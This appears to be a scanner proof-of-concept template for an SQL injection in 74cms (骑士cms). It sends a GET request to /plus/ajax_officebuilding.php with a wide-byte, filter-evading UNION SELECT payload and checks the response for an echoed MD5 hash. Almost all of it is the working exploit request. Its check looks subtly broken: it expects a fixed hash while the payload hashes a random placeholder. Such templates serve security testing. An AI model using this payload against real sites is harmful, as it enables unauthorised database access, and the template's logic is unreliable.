{
    "Name": "74cms-sqli-2",
    "Description": "74cms-sqli-2",
    "Product": "骑士cms",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{rand}}),5,6,7,8,9%23",
        "Port":"",
        "Data":"",
        "follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
            "Check_Steps":"AND",
            "Checks": [
                    {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "202cb962ac59075b964b07152d234b70"
                    },
                     {
                    "Operation": "code", 
                    "Key":"",
                    "Value": "200"  
                     }
            ]
            },
            "Next_decide":""
        }
     ] }